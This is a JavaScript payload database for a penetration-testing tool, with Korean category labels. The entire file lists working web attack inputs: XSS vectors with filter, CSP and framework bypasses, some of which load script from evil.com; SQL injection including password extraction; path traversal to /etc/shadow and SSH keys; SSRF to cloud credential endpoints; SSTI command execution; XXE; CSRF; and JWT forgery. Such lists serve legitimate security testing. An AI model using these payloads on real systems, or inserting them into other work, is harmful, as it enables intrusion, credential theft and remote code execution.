// assets/db/payloads.js — PenTri v1.10 (PortSwigger 기반 + 최신 프레임워크)
const PAYLOAD_DB = {

  XSS: { label:'XSS', icon:'⚡', subs: {
    '기본 벡터': [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '"><script>alert(1)</script>',
      "'><img src=x onerror=alert(1)>",
      '<iframe src="javascript:alert(1)">',
      '<input autofocus onfocus=alert(1)>',
      '<select autofocus onfocus=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<object data="javascript:alert(1)">',
    ],
    '속성 탈출': [
      '" onmouseover="alert(1)"',
      "' onmouseover='alert(1)'",
      '"><svg onload=alert(1)>',
      '" autofocus onfocus="alert(1)"',
      '`onmouseover=alert(1)`',
      '" onblur="alert(1)" autofocus a="',
      "' onclick='alert(1)",
    ],
    '필터 우회': [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<IMG SRC=x oNeRrOr=alert(1)>',
      '<script>alert`1`</script>',
      '<script>alert(String.fromCharCode(49))</script>',
      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
      '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<svg><script>alert(1)</script></svg>',
      '<img src=1 href=1 onerror="javascript:alert(1)">',
    ],
    '글자수 제한 우회': [
      '<svg/onload=alert(1)>',
      '<img/src/onerror=alert(1)>',
      '$(alert(1))',
      '<script>eval(atob("YWxlcnQoMSk="))</script>',
      // URL에 payload 저장 후 짧은 코드로 호출
      '<script>$.getScript("//evil.com/x")</script>',
    ],
    '특정 태그 차단 우회': [
      // script 태그 차단 시
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
      // on* 핸들러 차단 시
      '<iframe src="javascript:alert(1)">',
      '<a href="javascript:alert(1)">click</a>',
      '<form><button formaction="javascript:alert(1)">click</button></form>',
    ],
    'DOM XSS': [
      'javascript:alert(1)',
      '#"><img src=x onerror=alert(1)>',
      '</script><script>alert(1)</script>',
      "';alert(1)//",
      "\';alert(1)//",
    ],
    'Vue.js': [
      '{{constructor.constructor("alert(1)")()}}',
      '{{$emit.constructor("alert(1)")()}}',
      '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
      // Vue 2
      '{{_self.$el.ownerDocument.defaultView.alert(1)}}',
    ],
    'React': [
      // dangerouslySetInnerHTML 통해서만 XSS 가능
      '{"__html": "<img src=x onerror=alert(1)>"}',
      // URL 기반
      'javascript:alert(1)',
    ],
    'Next.js / Nuxt': [
      // Server-side rendering escape
      '</script><script>alert(1)</script>',
      // API route
      '{"key": "<script>alert(1)</script>"}',
    ],
    'AngularJS (ng-app)': [
      '{{constructor.constructor("alert(1)")()}}',
      '{{$on.constructor("alert(1)")()}}',
      "{{['alert(1)'].map(eval)}}",
    ],
    'CSP 우회': [
      '<script nonce="NONCE_VALUE">alert(1)</script>',
      '<link rel=preload as=script href=//evil.com/xss.js>',
      '<base href=//evil.com>',
      '<meta http-equiv="Content-Security-Policy" content="">',
    ],
    'Polyglot': [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//",
    ],
  }},

  SQLi: { label:'SQL Injection', icon:'💉', subs: {
    '감지': [
      "'", '"', '`', "'--", "'#",
      "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
      "admin'--", "1; SELECT 1", "') OR ('1'='1",
    ],
    'Union Based': [
      "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--",
      "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
      "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
      "' UNION SELECT 1,username||':'||password,3 FROM users--",
    ],
    'Error Based (MySQL)': [
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
      "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",
      "' AND (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
    ],
    'Error Based (MSSQL)': [
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ],
    'Blind Boolean': [
      "' AND 1=1--", "' AND 1=2--",
      "' AND SUBSTRING(username,1,1)='a'--",
      "' AND (SELECT COUNT(*) FROM users)>0--",
      "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--",
    ],
    'Blind Time Based': [
      "'; WAITFOR DELAY '0:0:5'--",
      "' AND SLEEP(5)--", "' OR SLEEP(5)#",
      "'; SELECT pg_sleep(5)--",
      "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
    ],
    'WAF 우회': [
      "'/**/OR/**/1=1--",
      "' /*!OR*/ 1=1--",
      "' OR 0x31=0x31--",
      "'%20OR%201=1--",
      "' OR '1'='1'/*",
    ],
  }},

  LFI: { label:'LFI/Path Traversal', icon:'📁', subs: {
    '기본': [
      '../etc/passwd','../../etc/passwd','../../../etc/passwd',
      '../../../../etc/passwd','../../../../../etc/passwd',
    ],
    '인코딩 우회': [
      '..%2fetc%2fpasswd','..%252fetc%252fpasswd',
      '%2e%2e%2fetc%2fpasswd','....//....//etc/passwd',
      '..%c0%afetc%c0%afpasswd',
    ],
    'Null Byte (구형 PHP)': [
      '../etc/passwd%00', '../etc/passwd%00.jpg',
    ],
    'Windows': [
      '..\\windows\\win.ini','..\\..\\windows\\win.ini',
      'C:\\windows\\win.ini',
    ],
    '주요 대상': [
      '/etc/passwd','/etc/shadow','/etc/hosts',
      '/proc/self/environ','/proc/self/cmdline',
      '/var/log/apache2/access.log','/var/log/nginx/access.log',
      '/root/.ssh/id_rsa','/app/config/database.yml',
    ],
  }},

  SSRF: { label:'SSRF', icon:'🔀', subs: {
    '기본': [
      'http://localhost','http://127.0.0.1',
      'http://0.0.0.0','http://[::1]',
      'http://169.254.169.254',
    ],
    'AWS 메타데이터': [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.169.254/latest/user-data',
    ],
    'GCP / Azure': [
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://169.254.169.254/metadata/v1/',
    ],
    'IP 우회': [
      'http://127.1','http://0x7f000001','http://2130706433',
      'http://127.0.0.1.nip.io','http://127.00.00.01',
    ],
    '프로토콜': [
      'file:///etc/passwd','dict://127.0.0.1:6379/info',
      'gopher://127.0.0.1:9000/_',
    ],
  }},

  SSTI: { label:'SSTI', icon:'🧩', subs: {
    '탐지 (공통)': [
      '{{7*7}}','${7*7}','<%= 7*7 %>',
      '#{7*7}','*{7*7}',"{{7*'7'}}",
    ],
    'Jinja2 (Python)': [
      '{{config}}',
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      "{{lipsum.__globals__['os'].popen('id').read()}}",
    ],
    'Freemarker (Java)': [
      '${"freemarker.template.utility.Execute"?new()("id")}',
      '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    'Twig (PHP)': [
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    'ERB (Ruby)': [
      '<%= system("id") %>','<%= `id` %>',
    ],
    'Velocity (Java)': [
      '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()',
    ],
  }},

  OpenRedirect: { label:'Open Redirect', icon:'↪️', subs: {
    '기본 (타겟 URL 설정 후 사용)': [
      '//TARGET_URL',
      'https://TARGET_URL',
      '//TARGET_URL/%2f..',
      '///TARGET_URL',
    ],
    '인코딩 우회': [
      'https:%2f%2fTARGET_URL',
      '//%0dTARGET_URL',
      '//%0aTARGET_URL',
      '/%09/TARGET_URL',
    ],
  }},

  XXE: { label:'XXE', icon:'📄', subs: {
    '기본 파일 읽기': [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    ],
    'SSRF 연계': [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ],
    'Blind OOB': [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://TARGET_URL/evil.dtd"> %xxe;]><foo>test</foo>',
    ],
  }},

  CSRF: { label:'CSRF', icon:'🔄', subs: {
    'HTML Form': [
      '<form action="https://TARGET/api/action" method="POST"><input name="key" value="value"><input type="submit"></form><script>document.forms[0].submit()</script>',
      '<form action="https://TARGET/email/change" method="POST"><input type="hidden" name="email" value="attacker@evil.com"></form><script>document.forms[0].submit()</script>',
    ],
    'Fetch API': [
      'fetch("https://TARGET/api/action",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"key=value"})',
    ],
    'JSON CSRF': [
      '<form action="https://TARGET/api/change" method="POST" enctype="text/plain"><input name=\'{"email":"attacker@evil.com","x":"\' value=\'"}\' type="hidden"></form>',
    ],
  }},

  JWT: { label:'JWT 공격', icon:'🔑', subs: {
    'alg:none': [
      '{"alg":"none","typ":"JWT"}',
      '{"alg":"None","typ":"JWT"}',
      '{"alg":"NONE","typ":"JWT"}',
    ],
    'RS256→HS256': [
      '// Header alg를 RS256→HS256 변경 후 공개키로 서명',
    ],
    'kid 인젝션': [
      '{"kid":"../../dev/null","typ":"JWT"}',
      '{"kid":"x\' UNION SELECT \'mysecret","typ":"JWT"}',
    ],
  }},

  CORS: { label:'CORS 테스트', icon:'🌐', subs: {
    '테스트 헤더': [
      'Origin: https://evil.com',
      'Origin: null',
      'Origin: https://TARGET.evil.com',
      'Origin: https://evil.TARGET.com',
    ],
  }},
};
